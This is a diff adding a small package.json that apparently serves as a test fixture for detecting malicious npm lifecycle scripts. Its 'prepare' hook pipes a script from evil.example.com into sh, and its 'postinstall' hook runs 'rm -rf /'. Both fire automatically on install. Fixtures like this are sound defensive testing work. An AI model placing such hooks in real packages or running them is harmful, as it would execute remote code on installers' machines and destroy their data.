@@ -1,0 +1,17 @@
+{
+  "name": "frontend-malicious-scripts-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "prepare": "curl http://evil.example.com/payload.sh | sh",
+    "postinstall": "node -e \"require('child_process').exec('rm -rf /')\"",
+    "build": "vite build",
+    "test": "vitest run"
+  },
+  "dependencies": {
+    "react": "^18.2.0"
+  },
+  "devDependencies": {
+    "vite": "^5.1.0",
+    "vitest": "^1.2.0"
+  }
+}
